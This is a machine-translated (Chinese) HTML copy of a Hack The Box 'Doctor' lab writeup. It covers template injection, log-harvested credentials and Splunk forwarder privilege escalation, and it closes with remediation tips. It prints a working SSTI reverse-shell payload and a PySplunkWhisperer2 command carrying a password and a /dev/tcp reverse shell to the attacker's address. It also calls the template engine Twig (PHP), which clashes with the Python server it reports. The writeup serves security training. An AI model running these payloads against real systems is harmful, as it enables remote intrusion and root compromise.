<html>
<head>
<title>HTB Doctor [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB医生[报道]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-doctor-writeup-61e589400875?source=collection_archive---------0-----------------------#2021-02-07">https://infosecwriteups.com/htb-doctor-writeup-61e589400875?source=collection_archive---------0-----------------------#2021-02-07</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="22fe" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">服务器端模板注入| Splunk用友RCE</h2></div><h1 id="fd56" class="ki kj it bd kk kl km kn ko kp kq kr ks jz kt ka ku kc kv kd kw kf kx kg ky kz bi translated">摘要</h1><p id="c56f" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">该计算机正在端口80上运行web应用程序，该应用程序易受服务器端模板注入(SSTI)的攻击。该攻击可用于直接攻击内部web服务器，从而导致RCE攻击。</p><p id="dbfe" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">这台机器上运行的web应用程序正在使用<strong class="lc iu"> Twig(PHP) </strong>模板在网页和电子邮件中嵌入动态内容。使用该web应用程序，<strong class="lc iu">用户</strong>可以在自己注册到该系统后<strong class="lc iu">发表评论</strong>。由于在用户输入数据时没有<strong class="lc iu">没有</strong> <strong class="lc iu">净化</strong> <strong class="lc iu">检查</strong>，因此极易受到SSTI攻击。</p><p id="8252" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">对于权限提升，在枚举过程中发现，只需利用splunk通用转发器RCE漏洞就可以获得根权限。请记住，此计算机正在端口8089上运行Splunk Atom Feed: Splunkd Rest API。</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><p id="963b" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu">计算平台:</strong> Ubuntu</p><p id="7b35" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu">使用的工具:</strong></p><ul class=""><li id="0d94" class="mi mj it lc b ld lw lg lx lj mk ln ml lr mm lv mn mo mp mq bi translated"><strong class="lc iu">枚举</strong> — <code class="fe mr ms mt mu b">nmap</code> | <code class="fe mr ms mt mu b">gobuster</code> | <code class="fe mr ms mt mu b">dirsearch.py</code></li><li id="de0b" class="mi mj it lc b ld mv lg mw lj mx ln my lr mz lv mn mo mp mq bi translated"><strong class="lc iu"> Linux盒子枚举</strong>——<code class="fe mr ms mt mu b">linpeas.sh</code>|<code class="fe mr ms mt mu b">ps -aux</code>|<code class="fe mr ms mt mu b">/etc/passwd</code></li><li id="0c50" class="mi mj it lc b ld mv lg mw lj mx ln my lr mz lv mn mo mp mq bi translated"><strong class="lc iu">漏洞利用</strong> —自定义代码|<a class="ae na" href="https://github.com/DaniloCaruso/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py" rel="noopener ugc nofollow" target="_blank">pysplunkwhisper 2</a></li></ul><p id="25dd" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu"> CVE(美国)</strong></p><p id="9aa6" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu">关键词:</strong> Linux |服务器:werkzeug/1 . 0 . 1 python 3 . 8 . 2 | splunkd 8 . 0 . 5 | Apache/2 . 4 . 41(Ubuntu)服务器| REST API | SSTI</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="c484" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">列举</h1><p id="aa30" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">Nmap TCP扫描输出</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ng"><img src="../Images/6131302a5bc198059abfaabeebcda1ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*noXqkXFZvPM3K0hP2YkCkA.png"/></div></div></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="1452" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">据点</h1><p id="4be7" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated"><strong class="lc iu">* * * * * * * *端口80 HTTP</strong>Apache httpd 2 . 4 . 41(Ubuntu)<strong class="lc iu">* * * * * * * * * * * * * * * *</strong></p><p id="9ae6" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">对于这台机器，至少我们知道这个网站很容易受到某种注射。经过一番侦察，登录入口被找到了。</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ns"><img src="../Images/b8e40312eb71e8076e0bb070bc1e9f1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/format:webp/1*-WAGu7dyiK-Aa3iH7L5F0Q.png"/></div></div><figcaption class="nt nu gj gh gi nv nw bd b be z dk translated"><a class="ae na" href="http://10.10.10.209/departments.html#" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 10 . 209/departments . html #</a></figcaption></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nx"><img src="../Images/9e1b2a4cd4fc479a46e4ab213381685c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mLOKvArmPmOBFQCI4ej0iQ.png"/></div></div></figure><p id="33e8" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">在这里我注册了自己，在那里我可以发表评论。现在，这是可以执行注入攻击的地方。</p><p id="5d13" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">运行不同的基本注入代码并检查它们的输出。对于这个站点，源代码没有泄漏任何输出。</p><p id="8d4d" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">在gobuster扫描期间，名为<strong class="lc iu">归档文件</strong>的目录是一个空白页。</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ny"><img src="../Images/e206328d527b82cc420e48387b52bcaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G4EiAl6Od6k12_sVVpU1mw.png"/></div></div></figure><p id="709a" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">发现在这个链接上看到了注入代码输出，源代码【http://doctors.htb/archive<a class="ae na" href="http://doctors.htb/archive" rel="noopener ugc nofollow" target="_blank">的</a>起作用了！</p><h2 id="3f7e" class="nz kj it bd kk oa ob dn ko oc od dp ks lj oe of ku ln og oh kw lr oi oj ky ok bi translated"><strong class="ak">剥削SSTI </strong></h2><p id="8c7c" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated"><strong class="lc iu">步骤1 </strong> —注入以下代码，用于服务器端模板注入</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ol"><img src="../Images/05091c941c2d0e2610871ec13283a5ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*onoxHxhRO6Fg751R_-77QQ.png"/></div></div></figure><p id="4cf6" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu">步骤2 </strong> —访问<a class="ae na" href="http://doctors.htb/archive" rel="noopener ugc nofollow" target="_blank">http://doctors.htb/archive</a>源代码，其中输出是注入代码的结果。</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi om"><img src="../Images/714d5024bb3f5d88057376ddd9423fb9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SitwW6muSjDov99-n6yrlw.png"/></div></div></figure><p id="de95" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">既然模板注入已经确定，我们就可以滥用它来获得反向壳。</p></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><p id="3534" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><strong class="lc iu">* * * * * * * *端口8089 SSL/HTTP</strong>Splunkd httpd<strong class="lc iu">* * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="19ee" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">在这一阶段，以下网站没有用，因为它需要用户登录才能访问<strong class="lc iu">服务。</strong></p><blockquote class="on oo op"><p id="90e4" class="la lb oq lc b ld lw ju lf lg lx jx li or ly ll lm os lz lp lq ot ma lt lu lv im bi translated">由于服务在端口8089上使用了<strong class="lc iu"> ssl/http </strong>，因此URL应该是:<a class="ae na" href="https://10.10.10.209:8089" rel="noopener ugc nofollow" target="_blank"><strong class="lc iu">https://10 . 10 . 10 . 209:8089</strong></a></p></blockquote><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ou"><img src="../Images/a49db0badc0eac8a054dc57f02188a0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d-CPk0OyPDxxAWwdm3Jcig.png"/></div></div></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="cdab" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">反向外壳</h1><p id="44a4" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">按照上面显示的攻击步骤，我使用了下面的SSTI漏洞利用代码来生成一个反向外壳。</p><p id="4547" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><code class="fe mr ms mt mu b">{% for x in ().__class__.__base__.__subclasses__() %}{% if “warning” in x.__name__ %}{{x()._module.__builtins__[‘__import__’](‘os’).popen(“bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.14.14/1234 0&gt;&amp;1’”).read()}}{%endif%}{%endfor%}</code></p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ov"><img src="../Images/b83ee4b632680a1b830fb6526f734228.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8OsOpFebX45VMBY0CqvPrQ.png"/></div></div><figcaption class="nt nu gj gh gi nv nw bd b be z dk translated">这之后必须刷新页面:<a class="ae na" href="http://doctors.htb/archive" rel="noopener ugc nofollow" target="_blank">http://doctors.htb/archive</a>获取外壳</figcaption></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ow"><img src="../Images/dfa3973d2f2fbbcf927372e8f11c40f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U29O30ToeoHQwCyHp3bNsg.png"/></div></div></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="1268" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">横向运动</h1><p id="d085" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">分析了<code class="fe mr ms mt mu b">linpeas.sh</code>的输出，我最终在apache2日志中发现了用户名和密码。</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ox"><img src="../Images/d495467424545118a264b4b74e7ea710.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1KwYcsCmUjFOvk9NdFCa2A.png"/></div></div></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oy"><img src="../Images/ba85ee93f868d86038147ea73920cc97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7gEnWGRExN3URM6dIgoDTg.png"/></div></div><figcaption class="nt nu gj gh gi nv nw bd b be z dk translated">成功了！！！</figcaption></figure><blockquote class="on oo op"><p id="2492" class="la lb oq lc b ld lw ju lf lg lx jx li or ly ll lm os lz lp lq ot ma lt lu lv im bi translated"><strong class="lc iu">注意:</strong>使用同样的凭证，我们也可以登录到https://doctor.htb:8089/services</p></blockquote><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oz"><img src="../Images/3b838400097eb395d5096172b8e428e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1W-tobztYqWJJnrTjSZjcA.png"/></div></div></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pa"><img src="../Images/a677beb59a6f486a18eee162aee7c720.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q6HYNJbE-k26NJns7IjrYQ.png"/></div></div></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="4fc6" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">权限提升</h1><p id="46c5" class="pw-post-body-paragraph la lb it lc b ld le ju lf lg lh jx li lj lk ll lm ln lo lp lq lr ls lt lu lv im bi translated">分析了<code class="fe mr ms mt mu b">linpeas.sh</code>,我强调了下面的输出:(尽管一些基本的检查也会有所帮助)</p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pb"><img src="../Images/f785083b301910faf93c90a0386e7a81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N5p4E2dJs96e51FCVJK7Yg.png"/></div></div></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pc"><img src="../Images/1ac63d09c9056933c68b1b50a8173b35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VKchNu2ycQT3BAdnZaY5Xw.png"/></div></div></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pd"><img src="../Images/8044d99589344e7cd28205eafb426824.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SmFLEOrPvBF9gOHSQk1DWg.png"/></div></div></figure><p id="9266" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated">发现<a class="ae na" href="https://github.com/DaniloCaruso/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py" rel="noopener ugc nofollow" target="_blank">漏洞利用</a>脚本在Linux上为Splunk通用转发器运行远程代码执行(RCE)。</p><p id="cd0b" class="pw-post-body-paragraph la lb it lc b ld lw ju lf lg lx jx li lj ly ll lm ln lz lp lq lr ma lt lu lv im bi translated"><code class="fe mr ms mt mu b">python pySplunkWhisperer2_remote.py --lhost 10.10.14.28 --host 10.10.10.209 --username shaun --password Guitar123 --payload “/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.14.28/8898 0&gt;&amp;1’”</code></p><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pe"><img src="../Images/3817aa3757acf4e738c254012e1c006c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gPyS_67ENfuNyaWhK1fBOw.png"/></div></div></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pf"><img src="../Images/a19562d655262369df33592869b430d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rwxn0uK3v06u60nKDljSwQ.png"/></div></div><figcaption class="nt nu gj gh gi nv nw bd b be z dk translated"><strong class="bd kk">成功！！！</strong></figcaption></figure><figure class="nh ni nj nk gt nl gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/f57d340ad1cfd7c33ce881500edeee36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/1*ap7ezighG3Yv52_hB1B2uA.gif"/></div></figure></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h1 id="f57d" class="ki kj it bd kk kl nb kn ko kp nc kr ks jz nd ka ku kc ne kd kw kf nf kg ky kz bi translated">补救</h1><ul class=""><li id="1371" class="mi mj it lc b ld le lg lh lj ph ln pi lr pj lv mn mo mp mq bi translated">净化SSTI，在处理用户输入时删除不需要的和危险的字符。</li><li id="ee19" class="mi mj it lc b ld mv lg mw lj mx ln my lr mz lv mn mo mp mq bi translated">Splunk UF应该以尽可能低的权限运行。</li><li id="c531" class="mi mj it lc b ld mv lg mw lj mx ln my lr mz lv mn mo mp mq bi translated">更改用友密码。</li><li id="cd3d" class="mi mj it lc b ld mv lg mw lj mx ln my lr mz lv mn mo mp mq bi translated">禁用Splunk UF管理端口(8089)</li></ul></div></div>    
</body>
</html>